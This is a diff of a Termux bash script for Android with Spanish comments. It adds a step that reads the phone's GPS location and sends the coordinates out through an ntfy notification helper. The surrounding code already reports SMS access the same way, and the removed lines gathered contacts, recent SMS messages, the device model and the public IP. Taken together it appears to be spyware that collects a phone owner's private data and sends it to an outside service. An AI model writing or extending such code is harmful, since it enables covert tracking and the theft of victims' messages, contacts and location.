@@ -1,7 +1,3 @@
-
-{
-# aquí va TODO el código del script
-
 #!/data/data/com.termux/files/usr/bin/bash
 
 # === CONFIGURACIÓN ===
@@ -49,19 +45,14 @@ else
     enviar_ntfy "⚠️ SMS no disponibles o sin permisos"
 fi
 
-echo "🔍 Ejecutando script..."
+# === 4. Ubicación ===
+UBICACION=$(termux-location -p gps -r once 2>/dev/null)
+if [ -n "$UBICACION" ]; then
+    LAT=$(echo "$UBICACION" | jq -r '.latitude')
+    LON=$(echo "$UBICACION" | jq -r '.longitude')
+    enviar_ntfy "📍 Ubicación: Latitud $LAT, Longitud $LON"
+else
+    enviar_ntfy "⚠️ Ubicación no disponible o sin permisos"
+fi
 
-echo "Obteniendo datos del dispositivo..."
-echo "Modelo: $(getprop ro.product.model)"
-echo "IP: $(curl -s ifconfig.me)"
-
-echo "Obteniendo contactos..."
-termux-contact-list
-
-echo "Obteniendo SMS..."
-termux-sms-list -l 5
-#!/data/data/com.termux/files/usr/bin/bash
-
-# === Obtener coordenadas ===
-ubicacion=$(termux-location --provider gps --request once 2>/dev/null | jq -r '"📍 Latitud:
-} > /dev/null 2>&1
+# Fin del script
